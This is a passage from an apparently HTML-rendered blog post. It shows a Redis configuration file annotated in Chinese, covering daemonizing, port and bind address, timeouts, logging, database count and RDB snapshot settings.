class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># redis &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x793A;&#x4F8B;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x4F60;&#x9700;&#x8981;&#x4E3A;&#x67D0;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x6307;&#x5B9A;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5FC5;&#x987B;&#x8981;&#x5E26;&#x4E0A;&#x5355;&#x4F4D;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x901A;&#x5E38;&#x7684;&#x683C;&#x5F0F;&#x5C31;&#x662F; 1k 5gb 4m &#x7B49;&#x9171;&#x7D2B;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1k =&gt; 1000 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1kb =&gt; 1024 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1m =&gt; 1000000 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1mb =&gt; 1024*1024 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1g =&gt; 1000000000 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1gb =&gt; 1024*1024*1024 bytes</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5185;&#x5B58;&#x914D;&#x7F6E;&#x5927;&#x5C0F;&#x5199;&#x662F;&#x4E00;&#x6837;&#x7684;.&#x6BD4;&#x5982; 1gb 1Gb 1GB 1gB</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ &#x5E38;&#x7528; #####################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># daemonize no &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;redis&#x4E0D;&#x662F;&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes</span></span><br><span class=\"line\">daemonize yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;redis&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x628A;pid&#x6587;&#x4EF6;&#x653E;&#x5728;/var/run/redis.pid&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x5230;&#x5176;&#x4ED6;&#x5730;&#x5740;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x8FD0;&#x884C;&#x591A;&#x4E2A;redis&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E0D;&#x540C;&#x7684;pid&#x6587;&#x4EF6;&#x548C;&#x7AEF;&#x53E3;</span></span><br><span class=\"line\">pidfile /var/run/redis.pid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;redis&#x8FD0;&#x884C;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;6379</span></span><br><span class=\"line\">port 6379</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># TCP &#x76D1;&#x542C;&#x7684;&#x6700;&#x5927;&#x5BB9;&#x7EB3;&#x6570;&#x91CF;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x9AD8;&#x5E76;&#x53D1;&#x7684;&#x73AF;&#x5883;&#x4E0B;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x8C03;&#x9AD8;&#x4EE5;&#x907F;&#x514D;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x7F13;&#x6162;&#x7684;&#x95EE;&#x9898;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># Linux &#x5185;&#x6838;&#x4F1A;&#x4E00;&#x58F0;&#x4E0D;&#x54CD;&#x7684;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x7F29;&#x5C0F;&#x6210; /proc/sys/net/core/somaxconn &#x5BF9;&#x5E94;&#x7684;&#x503C;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6240;&#x4EE5;&#x4F60;&#x8981;&#x4FEE;&#x6539;&#x8FD9;&#x4E24;&#x4E2A;&#x503C;&#x624D;&#x80FD;&#x8FBE;&#x5230;&#x4F60;&#x7684;&#x9884;&#x671F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># tcp-backlog 511</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;redis &#x5728; server &#x4E0A;&#x6240;&#x6709;&#x6709;&#x6548;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x4E0A;&#x76D1;&#x542C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x5982;&#x679C;&#x53EA;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x4E0A;&#x76D1;&#x542C;&#xFF0C;&#x90A3;&#x4F60;&#x5C31;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;IP&#x6216;&#x8005;&#x591A;&#x4E2A;IP&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x793A;&#x4F8B;&#xFF0C;&#x591A;&#x4E2A;IP&#x7528;&#x7A7A;&#x683C;&#x9694;&#x5F00;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># bind 192.168.1.100 10.0.0.1</span></span><br><span class=\"line\"><span class=\"built_in\">bind</span> 127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Specify the path for the unix socket that will be used to listen for</span></span><br><span class=\"line\"><span class=\"comment\"># incoming connections. There is no default, so Redis will not listen</span></span><br><span class=\"line\"><span class=\"comment\"># on a unix socket when not specified.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A; unix socket &#x7684;&#x8DEF;&#x5F84;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># unixsocket /tmp/redis.sock</span></span><br><span class=\"line\"><span class=\"comment\"># unixsocketperm 755</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x65F6;&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x4E3A;&#x79D2;&#x3002;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x6CA1;&#x6709;&#x53D1;&#x51FA;&#x4EFB;&#x4F55;&#x6307;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;&#x5173;&#x95ED;&#x8BE5;&#x8FDE;&#x63A5;</span></span><br><span class=\"line\"><span class=\"comment\"># 0&#x662F;&#x5173;&#x95ED;&#x6B64;&#x8BBE;&#x7F6E;</span></span><br><span class=\"line\">timeout 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># tcp &#x5FC3;&#x8DF3;&#x5305;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;&#x975E;&#x96F6;&#xFF0C;&#x5219;&#x5728;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x7F3A;&#x4E4F;&#x901A;&#x8BAF;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528; SO_KEEPALIVE &#x53D1;&#x9001; tcp acks &#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x4E4B;&#x6240;&#x6709;&#x6709;&#x7528;&#xFF0C;&#x4E3B;&#x8981;&#x7531;&#x4E24;&#x4E2A;&#x539F;&#x56E0;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) &#x9632;&#x6B62;&#x6B7B;&#x7684; peers</span></span><br><span class=\"line\"><span class=\"comment\"># 2) Take the connection alive from the point of view of network</span></span><br><span class=\"line\"><span class=\"comment\">#    equipment in the middle.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># On Linux, the specified value (in seconds) is the period used to send ACKs.</span></span><br><span class=\"line\"><span class=\"comment\"># Note that to close the connection the double of the time is needed.</span></span><br><span class=\"line\"><span class=\"comment\"># On other kernels the period depends on the kernel configuration.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A reasonable value for this option is 60 seconds.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x63A8;&#x8350;&#x4E00;&#x4E2A;&#x5408;&#x7406;&#x7684;&#x503C;&#x5C31;&#x662F;60&#x79D2;</span></span><br><span class=\"line\">tcp-keepalive 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x7EA7;&#x522B;</span></span><br><span class=\"line\"><span class=\"comment\"># Redis&#x603B;&#x5171;&#x652F;&#x6301;&#x56DB;&#x4E2A;&#x7EA7;&#x522B;&#xFF1A;debug&#x3001;verbose&#x3001;notice&#x3001;warning&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;verbose</span></span><br><span class=\"line\"><span class=\"comment\"># debug &#x8BB0;&#x5F55;&#x5F88;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x4E8E;&#x5F00;&#x53D1;&#x548C;&#x6D4B;&#x8BD5;</span></span><br><span class=\"line\"><span class=\"comment\"># varbose &#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x4E0D;&#x50CF;debug&#x4F1A;&#x8BB0;&#x5F55;&#x90A3;&#x4E48;&#x591A;</span></span><br><span class=\"line\"><span class=\"comment\"># notice &#x666E;&#x901A;&#x7684;verbose&#xFF0C;&#x5E38;&#x7528;&#x4E8E;&#x751F;&#x4EA7;&#x73AF;&#x5883;</span></span><br><span class=\"line\"><span class=\"comment\"># warning &#x53EA;&#x6709;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x6216;&#x8005;&#x4E25;&#x91CD;&#x7684;&#x4FE1;&#x606F;&#x4F1A;&#x8BB0;&#x5F55;&#x5230;&#x65E5;&#x5FD7;</span></span><br><span class=\"line\">loglevel debug</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x914D;&#x7F6E;log&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4E0D;&#x540C;&#x7684;redis&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x503C;&#x4E3A;stdout&#xFF0C;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF0C;&#x82E5;&#x540E;&#x53F0;&#x6A21;&#x5F0F;&#x4F1A;&#x8F93;&#x51FA;&#x5230;/dev/null</span></span><br><span class=\"line\"><span class=\"comment\"># logfile stdout</span></span><br><span class=\"line\">logfile /var/<span class=\"built_in\">log</span>/redis/redis.log</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8981;&#x60F3;&#x628A;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x5230;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#xFF0C;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E5F;&#x53EF;&#x4EE5;&#x53EF;&#x9009;&#x62E9;&#x6027;&#x7684;&#x66F4;&#x65B0;&#x5176;&#x4ED6;&#x7684;syslog &#x53C2;&#x6570;&#x4EE5;&#x8FBE;&#x5230;&#x4F60;&#x7684;&#x8981;&#x6C42;</span></span><br><span class=\"line\"><span class=\"comment\"># syslog-enabled no</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E; syslog &#x7684; identity&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># syslog-ident redis</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E; syslog &#x7684; facility&#xFF0C;&#x5FC5;&#x987B;&#x662F; USER &#x6216;&#x8005;&#x662F; LOCAL0-LOCAL7 &#x4E4B;&#x95F4;&#x7684;&#x503C;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># syslog-facility local0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x76EE;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x6570;&#x636E;&#x5E93;&#x662F; DB 0&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x4E0A;&#x4F7F;&#x7528; select &lt;dbid&gt; &#x547D;&#x4EE4;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F; dbid &#x5FC5;&#x987B;&#x662F;&#x4E00;&#x4E2A;&#x4ECB;&#x4E8E; 0 &#x5230; databasees - 1 &#x4E4B;&#x95F4;&#x7684;&#x503C;</span></span><br><span class=\"line\">databases 16</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ &#x5FEB;&#x7167; #################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B58; DB &#x5230;&#x78C1;&#x76D8;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x683C;&#x5F0F;&#xFF1A;save &lt;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#xFF08;&#x79D2;&#xFF09;&gt; &lt;&#x5199;&#x5165;&#x6B21;&#x6570;&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x6839;&#x636E;&#x7ED9;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x548C;&#x5199;&#x5165;&#x6B21;&#x6570;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5230;&#x78C1;&#x76D8;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x7684;&#x610F;&#x601D;&#x662F;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#   900 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 1 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\">#   300 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 10 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\">#   60 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 10000 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\">#&#x3000;&#x3000;</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x6CE8;&#x610F;&#xFF1A;&#x4F60;&#x53EF;&#x4EE5;&#x6CE8;&#x91CA;&#x6389;&#x6240;&#x6709;&#x7684; save &#x884C;&#x6765;&#x505C;&#x7528;&#x4FDD;&#x5B58;&#x529F;&#x80FD;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E00;&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x5B9E;&#x73B0;&#x505C;&#x7528;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#   save &quot;&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">save 900 1</span><br><span class=\"line\">save 300 10</span><br><span class=\"line\">save 60 10000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C; redis &#x6700;&#x540E;&#x4E00;&#x6B21;&#x7684;&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x5931;&#x8D25;&#xFF0C;redis &#x5C06;&#x505C;&#x6B62;&#x63A5;&#x53D7;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x6837;&#x4EE5;&#x4E00;&#x79CD;&#x5F3A;&#x786C;&#x7684;&#x65B9;&#x5F0F;&#x8BA9;&#x7528;&#x6237;&#x77E5;&#x9053;&#x6570;&#x636E;&#x4E0D;&#x80FD;&#x6B63;&#x786E;&#x7684;&#x6301;&#x4E45;&#x5316;&#x5230;&#x78C1;&#x76D8;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5426;&#x5219;&#x5C31;&#x4F1A;&#x6CA1;&#x4EBA;&#x6CE8;&#x610F;&#x5230;&#x707E;&#x96BE;&#x7684;&#x53D1;&#x751F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x8FDB;&#x7A0B;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x5DE5;&#x4F5C;&#x4E86;&#xFF0C;redis &#x4E5F;&#x5C06;&#x81EA;&#x52A8;&#x7684;&#x5141;&#x8BB8;&#x5199;&#x64CD;&#x4F5C;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x7136;&#x800C;&#x4F60;&#x8981;&#x662F;&#x5B89;&#x88C5;&#x4E86;&#x9760;&#x8C31;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x4E0D;&#x5E0C;&#x671B; redis &#x8FD9;&#x6837;&#x505A;&#xFF0C;&#x90A3;&#x4F60;&#x5C31;&#x6539;&#x6210; no &#x597D;&#x4E86;&#x3002;</span></span><br><span class=\"line\">stop-writes-on-bgsave-error yes</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x662F;&#x5426;&#x5728; dump .rdb &#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528; LZF &#x538B;&#x7F29;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x90FD;&#x8BBE;&#x4E3A; yes</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x5E0C;&#x671B;&#x4FDD;&#x5B58;&#x5B50;&#x8FDB;&#x7A0B;&#x8282;&#x7701;&#x70B9; cpu &#xFF0C;&#x4F60;&#x5C31;&#x8BBE;&#x7F6E;&#x5B83;&#x4E3A; no &#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x53EF;&#x80FD;&#x5C31;&#x4F1A;&#x6BD4;&#x8F83;&#x5927;</span></span><br><span class=\"line\">rdbcompression yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x662F;&#x5426;&#x6821;&#x9A8C;rdb&#x6587;&#x4EF6;</span></span><br><span class=\"line\">rdbchecksum yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x672C;&#x5730;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;dump.rdb</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E0D;&#x540C;&#x7684;redis&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;db&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\">dbfilename dump.rdb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6570;&#x636E;&#x5E93;&#x955C;&#x50CF;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#x653E;&#x7F6E;&#x7684;&#x8DEF;&#x5F84;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x91CC;&#x7684;&#x8DEF;&#x5F84;&#x8DDF;&#x6587;&#x4EF6;&#x540D;&#x8981;&#x5206;&#x5F00;&#x914D;&#x7F6E;&#x662F;&#x56E0;&#x4E3A;redis&#x5728;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x65F6;&#xFF0C;&#x5148;&#x4F1A;&#x5C06;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x72B6;&#x6001;&#x5199;&#x5165;&#x5230;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7B49;&#x5907;&#x4EFD;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x518D;&#x628A;&#x8BE5;&#x8BE5;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x66FF;&#x6362;&#x4E3A;&#x4E0A;&#x9762;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x8FD9;&#x91CC;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x548C;&#x4E0A;&#x9762;&#x6240;&#x914D;&#x7F6E;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x5F84;&#x5F53;&#x4E2D;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># AOF&#x6587;&#x4EF6;&#x4E5F;&#x4F1A;&#x5B58;&#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x9762;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x5FC5;&#x987B;&#x5236;&#x5B9A;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x800C;&#x4E0D;&#x662F;&#x6587;&#x4EF6;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 